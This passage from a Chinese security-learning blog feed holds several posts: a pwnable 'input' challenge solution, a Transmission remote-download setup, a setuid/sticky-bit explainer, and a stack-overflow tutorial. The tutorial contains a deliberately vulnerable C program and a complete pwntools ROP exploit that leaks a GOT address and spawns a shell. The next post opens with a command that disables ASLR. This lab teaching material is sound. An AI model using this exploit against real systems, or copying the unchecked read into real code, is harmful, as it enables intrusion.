+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> myin[<span class="number">2</span>], myerr[<span class="number">2</span>];</span><br><span class="line">pipe(myin);<span class="comment">//建立一个用于输入流的管道</span></span><br><span class="line">pipe(myerr);<span class="comment">//建立一个用于错误流的管道</span></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();<span class="comment">//产生子进程，共享这两个管道</span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;<span class="comment">//如果是子进程</span></span><br><span class="line">  <span class="built_in">close</span>(myin[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(myerr[<span class="number">0</span>]);<span class="comment">//关闭读取的一端</span></span><br><span class="line">  <span class="built_in">write</span>(myin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">write</span>(myerr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);<span class="comment">//向管道写数据</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;<span class="comment">//如果是父进程</span></span><br><span class="line">  <span class="built_in">close</span>(myin[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(myerr[<span class="number">1</span>]);<span class="comment">//关闭输入的一端</span></span><br><span class="line">  dup2(myin[<span class="number">0</span>], <span class="number">0</span>);<span class="comment">//重定向到标准输入流</span></span><br><span class="line">  dup2(myerr[<span class="number">0</span>], <span class="number">2</span>);<span class="comment">//重定向到标准错误流</span></span><br><span class="line">  execve(argv[<span class="number">0</span>], argv, envp);<span class="comment">//父进程启动目标程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>env</p>
+<p>直接设置环境变量</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *envp[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>file</p>
+<p>直接写文件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"wb"</span>);</span><br><span class="line">fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>network</p>
+<p>socket编程，建立套接字然后连接，发送数据，注意端口设置在<code>argv[&#39;C&#39;]</code>中</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">2333</span>);</span><br><span class="line">serv.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line"><span class="keyword">int</span> sock = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">connect</span>(sock, &amp;serv, <span class="keyword">sizeof</span>(serv));</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="string">"\xde\xad\xbe\xef\n"</span>;</span><br><span class="line">send(sock, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">close</span>(sock);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>完整代码：<a href="https://raw.githubusercontent.com/void0red/code/master/pwnable/input2.c" target="_blank" rel="noopener">input2.c</a></p>
+<p>注意需要在运行程序的目录tmp底下建立flag的软连接<code>ln /home/input2/flag flag</code></p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>remote control transmission</title>
+    <url>/2018/03/17/remote_control_transmission/</url>
+    <content><![CDATA[<blockquote>
+<p>设备：<code>树莓派3B</code> 系统：<code>LEDE 4.4.92</code></p>
+</blockquote>
+<ol>
+<li><p>下载安装<code>transmission-cli-openssl</code> <code>transmission-daemon-openssl</code> <code>transmission-remote-openssl</code> <code>transmission-web</code> <code>luci-app-transmission</code> <code>luci-i18n-transmission-zh-cn</code></p>
+</li>
+<li><p>配置transmission</p>
+<p>直接在网页配置，或者使用配置文件<code>/etc/config/transmisson</code></p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config transmission</span><br><span class="line">        option config_dir &#39;&#x2F;tmp&#x2F;transmission&#39;</span><br><span class="line">        option mem_percentage &#39;50&#39;</span><br><span class="line">        option nice &#39;10&#39;</span><br><span class="line">        option ionice_flags &#39;-c 3&#39;</span><br><span class="line">        option alt_speed_enabled &#39;false&#39;</span><br><span class="line">        option bind_address_ipv4 &#39;0.0.0.0&#39;</span><br><span class="line">        option bind_address_ipv6 &#39;::&#39;</span><br><span class="line">        option blocklist_enabled &#39;true&#39;</span><br><span class="line">        option cache_size_mb &#39;2&#39;</span><br><span class="line">        option download_queue_enabled &#39;true&#39;</span><br><span class="line">        option download_queue_size &#39;4&#39;</span><br><span class="line">        option encryption &#39;1&#39;</span><br><span class="line">        option lazy_bitfield_enabled &#39;true&#39;</span><br><span class="line">        option lpd_enabled &#39;false&#39;</span><br><span class="line">        option message_level &#39;1&#39;</span><br><span class="line">        option peer_limit_global &#39;240&#39;</span><br><span class="line">        option peer_limit_per_torrent &#39;60&#39;</span><br><span class="line">        option peer_port &#39;51413&#39;</span><br><span class="line">        option peer_port_random_on_start &#39;false&#39;</span><br><span class="line">        option peer_socket_tos &#39;default&#39;</span><br><span class="line">        option pex_enabled &#39;true&#39;</span><br><span class="line">        option port_forwarding_enabled &#39;true&#39;</span><br><span class="line">        option preallocation &#39;1&#39;</span><br><span class="line">        option queue_stalled_enabled &#39;true&#39;</span><br><span class="line">        option queue_stalled_minutes &#39;30&#39;</span><br><span class="line">        option ratio_limit_enabled &#39;false&#39;</span><br><span class="line">        option rpc_authentication_required &#39;远程访问控制&#39;</span><br><span class="line">        option rpc_username &#39;远程访问用户名&#39;</span><br><span class="line">        option rpc_password &#39;远程访问密码&#39;</span><br><span class="line">        option rpc_bind_address &#39;0.0.0.0&#39;</span><br><span class="line">        option rpc_enabled &#39;是否打开远程访问&#39;</span><br><span class="line">        option rpc_port &#39;远程访问端口&#39;</span><br><span class="line">        option rpc_url &#39;&#x2F;transmission&#x2F;&#39;</span><br><span class="line">        option scrape_paused_torrents_enabled &#39;true&#39;</span><br><span class="line">        option script_torrent_done_enabled &#39;false&#39;</span><br><span class="line">        option speed_limit_down_enabled &#39;false&#39;</span><br><span class="line">        option speed_limit_up_enabled &#39;false&#39;</span><br><span class="line">        option trash_original_torrent_files &#39;false&#39;</span><br><span class="line">        option umask &#39;18&#39;</span><br><span class="line">        option upload_slots_per_torrent &#39;14&#39;</span><br><span class="line">        option utp_enabled &#39;true&#39;</span><br><span class="line">        option scrape_paused_torrents &#39;true&#39;</span><br><span class="line">        option watch_dir_enabled &#39;false&#39;</span><br><span class="line">        option download_dir &#39;下载目录&#39;</span><br><span class="line">        option rename_partial_files &#39;false&#39;</span><br><span class="line">        option seed_queue_enabled &#39;true&#39;</span><br><span class="line">        option incomplete_dir_enabled &#39;启用未完成目录&#39;</span><br><span class="line">        option incomplete_dir &#39;未完成目录&#39;</span><br><span class="line">        option enabled &#39;1&#39;</span><br><span class="line">        option start_added_torrents &#39;false&#39;</span><br><span class="line">        option rpc_whitelist_enabled &#39;false&#39;</span><br><span class="line">        option dht_enabled &#39;false&#39;</span><br><span class="line">        option idle_seeding_limit_enabled &#39;false&#39;</span><br><span class="line">        option blocklist_url &#39;URL阻止列表&#39;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个时候应该可以通过内网ip加port在浏览器访问到transmission的管理页面了</p>
+</blockquote>
+</li>
+<li><p>内网穿透</p>
+<p> 使用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行内网穿透，详细配置见官方文档，唯一需要注意的是如果配置到<code>custom_domains</code>选项（不出意外的话），如果是没有解析的ip直接填写ip，这样才能通过ip打开（真是恶心），外网服务端可以使用<code>nohup &amp;</code>或者<code>screen</code>将其置于后台运行，内网客户端可以添加开机自启动项（学校每晚断电233</p>
+<p>！！！切记不要在断电的边缘下载种子，可能造成内存卡<code>read only</code>，解决方法自行百度。</p>
+<blockquote>
+<p>这个时候应该可以通过外网ip加port在浏览器访问到transmission的管理页面了</p>
+</blockquote>
+</li>
+<li><p>手机客户端</p>
+<p>GitHub上有个transmission的开源手机客户端（Android）</p>
+<p>下载地址： <a href="https://github.com/urandom/gearshift/releases" target="_blank" rel="noopener">https://github.com/urandom/gearshift/releases</a></p>
+<p>配置很容易</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux权限(rws与rwt)</title>
+    <url>/2017/12/15/linux%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h2 id="0x00概念"><a href="#0x00概念" class="headerlink" title="0x00概念"></a>0x00概念</h2><p>一个文件都有一个所有者, 表示该文件是谁创建的. 同时, 该文件还有一个组编号, 表示该文件所属的组, 一般为文件所有者所属的组. 如果是一个可执行文件, 那么在执行时, 一般该文件只拥有调用该文件的用户具有的权限. 而<code>setuid</code>, <code>setgid</code> 可以来改变这种设置.</p>
+<p><code>setuid</code>:该标志是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令。通过设置<code>setuid</code>权限位（也就是<code>r-s--x--x</code>中的s),使可执行程序暂时获得root权限,及程序涉及到的root操作能够进行.</p>
+<a id="more"></a>
+<p><code>setgid</code>:该标志只对目录有效. 目录被设置该位后, 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组.</p>
+<p><code>sticky bit</code>: 该标志可以理解为防删除位. 一个目录里的文件是否可以被某用户删除, 主要取决于用户是否具有该目录的写权限. 如果没有写权限, 则这个目录下的所有文件都不能被删除, 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件, 则可以对目录使用<code>sticky bit</code>位. 设置该位后, 用户在该目录下建立文件或目录时，只有文件拥有者与root才有权力删除.</p>
+<p>注意:和一般的<code>rwx</code>标志不同,这些特殊标志不再区分所有者,组,其他用户这些概念,即<code>setuid</code>的标志位一定会出现在原本所有者可执行权限的标志位上,<code>setgid</code>的标志位一定会出现在原本组可执行权限的标志位上,<code>sticky</code>的标志位一定会出现在原本其他用户可执行权限的标志位上.</p>
+<h2 id="0x01使用"><a href="#0x01使用" class="headerlink" title="0x01使用"></a>0x01使用</h2><p>操作这些标志与操作文件权限的命令是一样的, 都是 <code>chmod</code>.</p>
+<ol>
+<li><p><code>chmod u+s temp</code> 为<code>temp</code><strong>文件</strong>加上<code>setuid</code>标志. (<code>setuid</code>只对文件有效)</p>
+<p><code>chmod g+s tempdir</code> 为<code>tempdir</code><strong>目录</strong>加上<code>setgid</code>标志 (<code>setgid</code>只对目录有效)</p>
+<p><code>chmod o+t tempdir</code> 为<code>tempdir</code><strong>目录</strong>加上<code>sticky bit</code>标志 (<code>sticky bit</code>只对目录有效)</p>
+<p>(这里的<code>u g o</code>仅仅是用来区分特殊标志的,或者说是指定放置标志的位置)</p>
+</li>
+<li><p><code>chmod  4777 temp</code> 为<code>temp</code><strong>文件</strong>加上<code>setuid</code>标志.</p>
+<p><code>chmod 2666 tempdir</code> 为<code>tempdir</code><strong>目录</strong>加上<code>setgid</code>标志</p>
+<p><code>chmod 1666 tempdir</code> 为<code>tempdir</code><strong>目录</strong>加上<code>sticky bit</code>标志</p>
+</li>
+</ol>
+<p><code>rwsrw-r--</code> 表示有<code>setuid</code>标志 <code>rwxrwsrw-</code> 表示有<code>setgid</code>标志 <code>rwxrw-rwt</code> 表示有<code>sticky bit</code>标志</p>
+<p>那么原来的执行标志x到哪里去了呢? 系统是这样规定的, 如果本来在该位上有x, 则这些特殊标志显示为小写字母 (s, s, t). 否则, 显示为大写字母 (S, S, T)</p>
+<h2 id="0x02例子"><a href="#0x02例子" class="headerlink" title="0x02例子"></a>0x02例子</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir tempdir    &#x2F;&#x2F;以root用户建立tempdir</span><br><span class="line">$ ls -l</span><br><span class="line">drwxr-xr-x  2 root     root      4096 12月 15 22:04 tempdir    &#x2F;&#x2F;tempdir文件夹的所有组和组为root</span><br><span class="line">$ sudo chmod 3777 tempdir    &#x2F;&#x2F;修改目录权限,添加setgid,sticky bit标志</span><br><span class="line">$ ls -l</span><br><span class="line">drwxrwsrwt  2 root     root      4096 12月 15 22:04 tempdir</span><br><span class="line">$cd tempdir</span><br><span class="line">$touch normal    &#x2F;&#x2F;以普通用户创建文件</span><br><span class="line">$ls -l</span><br><span class="line">-rw-rw-r-- 1 void0red root 0 12月 15 22:11 normal    &#x2F;&#x2F;因为setgid的原因,所属组变为了root</span><br><span class="line">$sudo touch super    &#x2F;&#x2F;以root用户创建文件</span><br><span class="line">$sudo chmod o+w super    &#x2F;&#x2F;添加一般用户的写权限</span><br><span class="line">$ls -l</span><br><span class="line">-rw-r--rw- 1 root     root 0 12月 15 22:14 super</span><br><span class="line">$rm super    &#x2F;&#x2F;试图以一般用户删除文件</span><br><span class="line">rm: cannot remove &#39;super&#39;: Operation not permitted    &#x2F;&#x2F;因为sticky bit的原因,即使有写的权限,也无法删除</span><br><span class="line">$cd ..</span><br><span class="line">$ sudo chmod o-t tempdir    &#x2F;&#x2F;去掉sticky bit标志</span><br><span class="line">$ls -l</span><br><span class="line">drwxrwsrwx  2 root     root      4096 12月 15 22:14 tempdir</span><br><span class="line">$cd tempdir</span><br><span class="line">$rm super    &#x2F;&#x2F;再次以一般用户删除文件</span><br><span class="line">$ls -l</span><br><span class="line">-rw-rw-r-- 1 void0red root 0 12月 15 22:11 normal    &#x2F;&#x2F;删除成功</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leak_got_addr</title>
+    <url>/2017/11/15/leak_gotaddr/</url>
+    <content><![CDATA[<blockquote>
+<p>this is a test, not true</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><ul>
+<li><p>本次实验的机器为<code>Ubuntu 16.04.2 LTS</code>64位系统</p>
+</li>
+<li><p>用<code>gcc</code>编译需要关闭<code>stack-protector</code></p>
+</li>
+<li><p>需要<code>gdb</code> <code>peda</code> <code>pwntools</code></p>
+<a id="more"></a></li>
+<li><p>攻击目标<code>test.c</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"2333\n"</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x01分析"><a href="#0x01分析" class="headerlink" title="0x01分析"></a>0x01分析</h2><p>这次把栈溢出的保护几乎都打开了，<code>ASLR</code>使得无法通过<code>ret2libc</code>来获得shell，栈上也没有可执行权限。所以可以通过<code>write</code>函数leak一个函数在内存中的地址（它是随机的），然后根据<code>libc.so.6</code>文件中<code>system</code>与<code>write</code>的相对地址，推算出<code>system</code>在本次运行中的内存中的地址。</p>
+<p>这里可以利用一个Linux下的特性，<strong>lazy binding</strong>，简单来说，GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
+<p>第一次函数调用：<br><img src="/images/leak_gotaddr_0.png" alt="第一次调用函数"><br>以后的函数调用：<br><img src="/images/leak_gotaddr_1.png" alt="以后的函数调用"></p>
+<p>例如：下面的执行流处于调用<code>write</code>函数的上面</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0x40056e &lt;main+8&gt;:	mov    edx,0x5</span><br><span class="line">   0x400573 &lt;main+13&gt;:	mov    esi,0x400624</span><br><span class="line">   0x400578 &lt;main+18&gt;:	mov    edi,0x1</span><br><span class="line">&#x3D;&gt; 0x40057d &lt;main+23&gt;:	call   0x400430 &lt;write@plt&gt;</span><br><span class="line">   0x400582 &lt;main+28&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x400586 &lt;main+32&gt;:	mov    edx,0x100</span><br><span class="line">   0x40058b &lt;main+37&gt;:	mov    rsi,rax</span><br><span class="line">   0x40058e &lt;main+40&gt;:	mov    edi,0x0</span><br></pre></td></tr></table></figure>
+
+<p>跟进去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008</span><br><span class="line">   0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010</span><br><span class="line">   0x40042c:	nop    DWORD PTR [rax+0x0]</span><br><span class="line">&#x3D;&gt; 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018</span><br><span class="line"> | 0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line"> | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line"> | 0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020</span><br><span class="line"> | 0x400446 &lt;read@plt+6&gt;:	push   0x1</span><br><span class="line"> |-&gt;   0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line">       0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line">       0x400440 &lt;read@plt&gt;:	jmp    QWORD PTR [rip+0x200bda]        # 0x601020</span><br><span class="line">       0x400446 &lt;read@plt+6&gt;:	push   0x1</span><br><span class="line">                                                                  JUMP is taken</span><br></pre></td></tr></table></figure>
+
+<p>指令准备发生跳转到<code>0x400420</code>处，而<code>0x400420</code>处的指令即是跳转到<code>0x601010</code>，<code>0x601010</code>处存储的是解析函数实际地址的指令地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  0x40041c:	add    BYTE PTR [rax],al</span><br><span class="line">   0x40041e:	add    BYTE PTR [rax],al</span><br><span class="line">   0x400420:	push   QWORD PTR [rip+0x200be2]        # 0x601008</span><br><span class="line">&#x3D;&gt; 0x400426:	jmp    QWORD PTR [rip+0x200be4]        # 0x601010</span><br><span class="line"> | 0x40042c:	nop    DWORD PTR [rax+0x0]</span><br><span class="line"> | 0x400430 &lt;write@plt&gt;:	jmp    QWORD PTR [rip+0x200be2]        # 0x601018</span><br><span class="line"> | 0x400436 &lt;write@plt+6&gt;:	push   0x0</span><br><span class="line"> | 0x40043b &lt;write@plt+11&gt;:	jmp    0x400420</span><br><span class="line"> |-&gt;   0x7ffff7dee870 &lt;_dl_runtime_resolve_avx&gt;:	push   rbx</span><br><span class="line">       0x7ffff7dee871 &lt;_dl_runtime_resolve_avx+1&gt;:	mov    rbx,rsp</span><br><span class="line">       0x7ffff7dee874 &lt;_dl_runtime_resolve_avx+4&gt;:	and    rsp,0xffffffffffffffe0</span><br><span class="line">       0x7ffff7dee878 &lt;_dl_runtime_resolve_avx+8&gt;:	sub    rsp,0x180</span><br><span class="line">                                                                  JUMP is taken</span><br></pre></td></tr></table></figure>
+
+<p>上面的<code>_dl_runtime_resolve_avx</code>函数就是解析实际地址的指令</p>
+<h2 id="0x02查找可用的gadgets"><a href="#0x02查找可用的gadgets" class="headerlink" title="0x02查找可用的gadgets"></a>0x02查找可用的gadgets</h2><p>因为<code>write</code>函数至少需要三个参数，所以需要找到<code>rdi，rsi，rdx</code>来传递参数，这个时候，<code>&lt;__libc_csu_init&gt;</code>函数就比较好用了，用<code>objdump -S test</code>来查看所有的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005a0:	41 57                	push   %r15</span><br><span class="line">  4005a2:	41 56                	push   %r14</span><br><span class="line">  4005a4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005a7:	41 55                	push   %r13</span><br><span class="line">  4005a9:	41 54                	push   %r12</span><br><span class="line">  4005ab:	4c 8d 25 5e 08 20 00 	lea    0x20085e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005b2:	55                   	push   %rbp</span><br><span class="line">  4005b3:	48 8d 2d 5e 08 20 00 	lea    0x20085e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005ba:	53                   	push   %rbx</span><br><span class="line">  4005bb:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005be:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005c1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005c4:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4005c8:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  4005cc:	e8 2f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005d1:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  4005d4:	74 20                	je     4005f6 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005d6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005df:	00</span><br><span class="line">  4005e0:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  4005e3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  4005e6:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  4005e9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  4005ed:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  4005f1:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  4005f4:	75 ea                	jne    4005e0 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  4005f6:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  4005fa:	5b                   	pop    %rbx</span><br><span class="line">  4005fb:	5d                   	pop    %rbp</span><br><span class="line">  4005fc:	41 5c                	pop    %r12</span><br><span class="line">  4005fe:	41 5d                	pop    %r13</span><br><span class="line">  400600:	41 5e                	pop    %r14</span><br><span class="line">  400602:	41 5f                	pop    %r15</span><br><span class="line">  400604:	c3                   	retq   </span><br><span class="line">  400605:	90                   	nop</span><br><span class="line">  400606:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40060d:	00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>可以看到从<code>0x4005fa</code>开始，进行了弹栈，可以控制<code>rbx，rbp，r12，r13，r14，r15</code>的值，配合<code>0x4005e0</code>处的指令，就可以控制<code>edi，rsi，rdx</code>的值了，要注意的是<code>0x4005f4</code>处有一个跳转指令，要让跳转失效，就必须让<code>rbp==rbx</code>，继续向前看，<code>0x4005ed</code>处让<code>rbx</code>加上了1，<code>0x4005e9</code>处的意思是调用<code>r12+rbx×8</code>处的指令，不妨让<code>rbx=0</code>，<code>rbp=1</code></p>
+<h2 id="0x03编写payload"><a href="#0x03编写payload" class="headerlink" title="0x03编写payload"></a>0x03编写payload</h2><p>尝试了一下新工具<code>pwntools</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./test'</span>)</span><br><span class="line">return_offset = <span class="number">24</span></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">gadget0_addr = <span class="number">0x4005fa</span></span><br><span class="line">gadget1_addr = <span class="number">0x4005e0</span></span><br><span class="line">main_addr = <span class="number">0x400566</span></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line">symbols_offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload1 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(gadget1_addr)</span><br><span class="line">payload1 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./test'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload1'</span></span><br><span class="line"></span><br><span class="line">r.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">system_addr = write_addr - symbols_offset</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload2 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(gadget1_addr)</span><br><span class="line">payload2 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload2'</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p64(system_addr))</span><br><span class="line">r.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'2333\n'</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span> * return_offset</span><br><span class="line">payload3 += p64(gadget0_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">payload3 += p64(gadget1_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------payload3'</span></span><br><span class="line">r.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>三段payload的结构大致相似，首先一段padding，填充到<code>read</code>函数的返回地址之前，然后让程序跳转到<code>pop...</code>处，接下来，是需要<code>pop</code>对象：</p>
+<p>第一个0是存进<code>rbx</code>的，第二个1是存进<code>rbp</code>的，接下来是<code>write</code>函数在GOT表中的地址，存进<code>r12</code>，也就是第二个<code>gadget</code>中<code>call</code>的对象，然后是<code>write</code>函数的三个参数（注意寄存器顺序），其中第二个参数是<code>write</code>函数在GOT表中的地址，因为已经执行过<code>write</code>函数了（现在执行流就在<code>write</code>函数里面），所以这个地址存放的指令不再是跳转，解析，而是<code>write</code>函数在内存中的实际地址，这样就让程序<code>leak</code>出了一段真实地址</p>
+<p>现在payload已经完成了所有值的传递，接着是第二段<code>gadget</code>，然后为了让程序回到<code>main</code>函数里面（保住接着溢出攻击），用54字节的padding填充弹栈行为，劫持到<code>0x400604</code>处的<code>retq</code>指令，回到<code>main</code>函数</p>
+<p>然后两个<code>payload</code>和第一个结构类似，第二个<code>payload</code>将<code>system</code>的实际地址，以及<code>/bin/sh</code>存入<code>.bss</code>段中，第三个<code>payload</code>则是调用<code>system</code>函数，实现getshell</p>
+<h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>通过<code>leak_gotaddr</code>，可以获得函数的真实地址，也就是绕过了<code>ASLR</code>的保护</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc</title>
+    <url>/2017/11/10/ret2libc/</url>
+    <content><![CDATA[<blockquote>
+<p>this is a test not true</p>
+</blockquote>
+<h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><ul>
+<li><p>本次实验的机器为<code>Ubuntu 16.04.2 LTS</code>64位系统</p>
+</li>
+<li><p>需要关闭ASLR，<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>，如果提示权限不够，可能需要用<code>su</code>提升权限</p>
+</li>
+<li><p>用<code>gcc</code>编译需要关闭<code>stack-protector</code>，打开NX</p>
+</li>
